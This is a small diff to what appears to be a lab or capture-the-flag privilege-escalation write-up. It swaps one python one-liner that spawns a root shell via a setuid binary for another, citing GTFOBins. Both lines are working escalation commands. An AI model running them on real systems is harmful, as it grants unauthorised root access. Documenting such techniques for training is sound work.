@@ -64,7 +64,7 @@ reference - https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html
 
 ![image](https://github.com/user-attachments/assets/40b3717f-6816-4dac-8153-f76aa1866927)
 
-Escalated priviledges to be root user by typing - ``` /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")' ```
+Escalated priviledges to be root user by typing - ``` ./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")' ```
 
 reference - https://gtfobins.github.io/gtfobins/python/
 
